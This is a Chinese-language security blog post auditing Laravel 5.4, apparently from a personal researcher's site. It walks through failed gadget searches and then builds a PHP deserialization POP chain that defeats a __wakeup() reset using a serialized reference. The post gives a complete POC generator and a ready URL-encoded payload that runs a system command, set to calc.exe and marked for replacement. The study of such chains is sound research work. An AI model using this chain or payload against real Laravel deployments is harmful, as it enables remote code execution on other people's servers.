<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;a = xxx</span><br></pre></td></tr></table></figure>

<p>这样，就可以进行序列化，然后直接修改<code>$a</code>的引用方式，使得其引用<code>$formatters</code>，然后对其进行重新赋值，达成绕过。</p>
<p>这里想要达成在<code>__wakeup()</code>之后重新赋值的操作，正常的想法，就是通过反序列化后，触发某个类中的<code>__wakeup()</code>方法来进行赋值，或是在销毁类的时候，调用其中的<code>__destruct()</code>方法，来进行操作。</p>
<p>这里全局搜索一下<code>__wakeup()</code>方法：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120002101874.png" alt="image-20221120002101874"></p>
<h3 id="尝试1："><a href="#尝试1：" class="headerlink" title="尝试1："></a>尝试1：</h3><p>每一个都看了一下，感觉上<code>/vendor/laravel/framework/src/Illuminate/Queue/SerializesModels.php</code>比较有可能性：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120002304205.png" alt="image-20221120002304205"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ((<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>))-&gt;<span class="title function_ invoke__">getProperties</span>() <span class="keyword">as</span> <span class="variable">$property</span>) &#123;</span><br><span class="line">            <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getRestoredPropertyValue</span>(</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPropertyValue</span>(<span class="variable">$property</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了一个foreach()函数进行了遍历，这里可以看到，使用了PHP中的反射类<code>ReflectionClass</code>，这个类的作用是通过类名来获取类的成员属性和方法信息。这里的参数是<code>$this</code>，也就是获取对象中的成员属性，然后会作为<code>ReflectionProperty</code>类的数组返回其中的成员。</p>
<p>通过foreach()函数，将值依次赋给<code>$property</code>。</p>
<p>然后调用了<code>setValue()</code>方法，这个是<code>ReflectionProperty</code>中自带的方法，用于对成员属性重新赋值，这里可以看到函数定义：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163657770.png" alt="image-20221120163657770"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163708953.png" alt="image-20221120163708953"></p>
<p>这里跟进一下<code>getRestoredPropertyValue()</code>方法，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120163758933.png" alt="image-20221120163758933"></p>
<p>第一个if会直接判断传入的参数是不是<code>ModelIdentifier</code>类中的成员属性，如果不是就会直接返回原值，到这里就够了，可以直接看下一步。</p>
<p>跟进一下<code>getPropertyValue()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221120164013663.png" alt="image-20221120164013663"></p>
<p>这里可以看到，就是直接调用了<code>setAccessible()</code>函数，保证这里可以访问保护或者是私有的属性，然后返回值。</p>
<p>本来这里应该是一个可以利用的点，但是因为这个类中没有定义成员变量，无法利用<code>setValue()</code>这一段。算是失败了。</p>
<h3 id="尝试2："><a href="#尝试2：" class="headerlink" title="尝试2："></a>尝试2：</h3><p>因为上面看过了__wakeup()函数暂时是没有可以利用点，这里重新看一下<code>__destruct()</code></p>
<p>看看能不能找到什么可以利用的点。</p>
<p>这里找到了一个疑似可以利用的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\vendor\sebastian\recursion-context\src\Context.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084701765.png" alt="image-20221121084701765"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084749431.png" alt="image-20221121084749431"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121084812105.png" alt="image-20221121084812105"></p>
<p>这里可以看到，作为私有属性定义的<code>$arrays</code>变量，只有通过<code>__construct()</code>方法进行赋值，或者是调用<code>addArray()</code>函数，进行属性的添加。因此我们可以对这个数组的内容进行操作。</p>
<p>但是，虽然可以对数组进行操作，但是我们不能对<code>$array</code>变量进行操作操作，因此不能使它对<code>$formatters</code>变量进行引用，也就不能利用了。</p>
<p>如果这里对<code>$array</code>进行了成员属性的定义，就是一个可以利用的点。</p>
<h3 id="尝试3："><a href="#尝试3：" class="headerlink" title="尝试3："></a>尝试3：</h3><p>这里还有一个疑似可以利用的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\vendor\symfony\routing\Loader\Configurator\CollectionConfigurator.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121161246529.png" alt="image-20221121161246529"></p>
<p>这里可以看见成员属性<code>$this-&gt;collection</code>被新建为了<code>RouteCollection</code>类的对象，然后在<code>__destruct()</code>中，进行了方法调用。</p>
<p>这里跟进一下<code>addPrefix</code>方法，这里看名字应该是某个添加什么东西的方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addPrefix</span>(<span class="params"><span class="variable">$prefix</span>, <span class="keyword">array</span> <span class="variable">$defaults</span> = [], <span class="keyword">array</span> <span class="variable">$requirements</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$prefix</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$prefix</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> === <span class="variable">$prefix</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;routes <span class="keyword">as</span> <span class="variable">$route</span>) &#123;</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">setPath</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$prefix</span>.<span class="variable">$route</span>-&gt;<span class="title function_ invoke__">getPath</span>());</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">addDefaults</span>(<span class="variable">$defaults</span>);</span><br><span class="line">            <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">addRequirements</span>(<span class="variable">$requirements</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里对$prefix参数进行了处理，将字符串左右的空白制表等符号，还有<code>/</code>去除，如果去除完了之后是空，则直接返回。如果不是，则对<code>RouteCollection</code>中的成员属性进行foreach()遍历。</p>
<p>这里跟进一下<code>setPath()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121164327784.png" alt="image-20221121164327784"></p>
<p>这里可以看到<code>$this-&gt;path</code>，这里有一个外面的<code>/</code>，没办法去除，绕不过。不然可以尝试去修改<code>$formatters</code></p>
<p>接下来看看<code>addDefaults</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121170300789.png" alt="image-20221121170300789"></p>
<p>其中<code>$this-&gt;defaults</code>的值是我们可以控制的，如果对传入的参数我们可以完全控制的话，<code>$name</code>和<code>$default</code>也都是我们可以控制的内容，这里就算是打通了。</p>
<p>也就是通过数组的相互引用来修改<code>$formatters</code>的值，具体操作思路如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//思路：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$default</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$array</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">array</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;<span class="keyword">default</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">array</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;<span class="keyword">default</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;a:2:&#123;i:0;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;&#125;s:7:&quot;default&quot;;R:2;s:5:&quot;array&quot;;a:5:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//注意看default后面那个R:2，这里是引用了$a的值。</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121172642826.png" alt="image-20221121172642826"></p>
<p>输出结果如上，可以看到$a的值，从<code>[&quot;a&quot;,&quot;b&quot;]</code>，变成了<code>[1,2,3,4,5]</code>这里可以实现修改。同样的，对于<code>$formatters</code>也可以进行这样的操作。</p>
<p>回头看一下<code>$defaults</code>值的获取。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122152428364.png" alt="image-20221122152428364"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221121173644281.png" alt="image-20221121173644281"></p>
<p>麻了，是不能传递参数的一个形参，这里用不了。</p>
<p>下面的<code>addRequirements()</code>函数也是同理，都是不能传递参数的一个形参，无法调用。</p>
<p>再回头看一下<code>addCollection()</code>这部分：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122160020766.png" alt="image-20221122160020766"></p>
<p>这部分可以看到调用了一个函数，直接跟进一下。这个是<code>RouteCollection</code>类中的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122160546267.png" alt="image-20221122160546267"></p>
<p>这里可以看到用的是传入的类中的参数，调用了其中的all()函数，这里跟进一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122162455672.png" alt="image-20221122162455672"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221122162552999.png" alt="image-20221122162552999"></p>
<p>可以看到这里关于<code>$routes</code>变量的赋值，是我们可以操控的。</p>
<p>这里这个函数的foreach()部分，和之前分析的基本一样，因此这里应该是可以打通的。</p>
<h3 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h3><p>用之前的POC来进行修改：</p>
<p>这里注意要利用<code>__wakeup()</code>和<code>__destruct()</code>执行的顺序差。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CollectionConfigurator</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> <span class="title class_">function</span> <span class="title class_">__construct</span>()&#123;</span><br><span class="line">            $<span class="title class_">this</span>-&gt;<span class="title class_">parent</span> = <span class="title class_">new</span> \<span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">RouteCollection</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;collection = <span class="keyword">new</span> <span class="title class_">\Symfony\Component\Routing\RouteCollection</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;route = <span class="keyword">new</span> <span class="title class_">\Symfony\Component\Routing\Route</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parentConfigurator = <span class="keyword">new</span> <span class="title class_">\Illuminate\Broadcasting\PendingBroadcast</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Traversable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RouteCollection</span> <span class="keyword">implements</span> \<span class="title">IteratorAggregate</span>, \<span class="title">Countable</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;routes = <span class="keyword">array</span>(<span class="string">&quot;dispatch&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement getIterator() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement count() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">implements</span> \<span class="title">Serializable</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="string">&#x27;////&#x27;</span>;  <span class="comment">//这里被trim了之后会直接为空，进入return，主要是为了方便</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>([</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;path,</span><br><span class="line">                <span class="string">&#x27;host&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;host,</span><br><span class="line">                <span class="string">&#x27;defaults&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;defaults,</span><br><span class="line">                <span class="string">&#x27;requirements&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;requirements,</span><br><span class="line">                <span class="string">&#x27;options&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;options,</span><br><span class="line">                <span class="string">&#x27;schemes&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;schemes,</span><br><span class="line">                <span class="string">&#x27;methods&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;methods,</span><br><span class="line">                <span class="string">&#x27;condition&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;condition,</span><br><span class="line">                <span class="string">&#x27;compiled&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;compiled,</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement unserialize() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span>  <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">\Faker\Generator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="string">&#x27;calc.exe&#x27;</span>; <span class="comment">//执行的命令在这里，修改了就可以</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$providers</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = [<span class="string">&#x27;useless&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">POC</span> = <span class="title class_">new</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>\<span class="title class_">CollectionConfigurator</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;363&#x27;</span>,<span class="string">&#x27;333&#x27;</span>,<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a:1:&#123;i:0;s:7:&quot;useless&quot;;&#125;&#x27;</span>, <span class="string">&#x27;R:3;&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$POC</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（有点丑，sorry)</p>
<p>然后输出的结果是：</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A68%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CCollectionConfigurator%22%3A4%3A%7Bs%3A6%3A%22parent%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A10%3A%22collection%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A5%3A%22route%22%3BC%3A31%3A%22Symfony%5CComponent%5CRouting%5CRoute%22%3A163%3A%7Ba%3A9%3A%7Bs%3A4%3A%22path%22%3Bs%3A4%3A%22%2F%2F%2F%2F%22%3Bs%3A4%3A%22host%22%3BN%3Bs%3A8%3A%22defaults%22%3BN%3Bs%3A12%3A%22requirements%22%3BN%3Bs%3A7%3A%22options%22%3BN%3Bs%3A7%3A%22schemes%22%3BN%3Bs%3A7%3A%22methods%22%3BN%3Bs%3A9%3A%22condition%22%3BN%3Bs%3A8%3A%22compiled%22%3BN%3B%7D%7Ds%3A18%3A%22parentConfigurator%22%3BO%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3BR%3A3%3Bs%3A12%3A%22%00%2A%00providers%22%3BN%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A8%3A%22calc.exe%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p>演示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221125021303083.png" alt="image-20221125021303083"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221125022008959.png" alt="image-20221125022008959"></p>
<p>到这里就算是告一段落了。</p>
<h2 id="利用链梳理："><a href="#利用链梳理：" class="headerlink" title="利用链梳理："></a>利用链梳理：</h2><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/%E6%97%A0%E6%A0%87%E9%A2%98.png" alt="无标题"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这条链子主要是因为inHann师傅在他的研究里给出的是一个依赖里的链子，所以我想看看在Laravel里面有没有可以不通过依赖直接利用的那个<code>__wakeup()</code>的地方，然后捣腾出来的。之前看了一些博客，说这里被<code>__wakeup()</code>的置空给堵死了，但其实还是有办法利用的。</p>
<p>（其实感觉有点属于屠龙之技，没什么用，主要还是给师傅们提供一个思路吧hhh，希望师傅们轻喷。）</p>
<p>这一次审计主要学到的还是这个对冲的操作在POP链中的利用方式，这个做法还是很灵活的。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Ho1L0w-By.github.io">Ho1L0w-By</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ho1l0w-by.github.io/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://ho1l0w-by.github.io/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Ho1L0w-By.github.io" target="_blank">Ho1L0w-By's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/"><img class="prev-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Smartbi系列漏洞详解</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP伪协议进阶</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习上</div></div></a></div><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习中</div></div></a></div><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习下</div></div></a></div><div><a href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP-5.0.x POP链"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-24</div><div class="title">ThinkPHP-5.0.x POP链</div></div></a></div><div><a href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">URLDNS与ysoserial简单使用</div></div></a></div><div><a href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">Smartbi系列漏洞详解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Myhead.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ho1L0w-By</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Ho1L0w-By"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Ho1L0w-By" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1691834629@qq.com" target="_blank" title="Email"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn 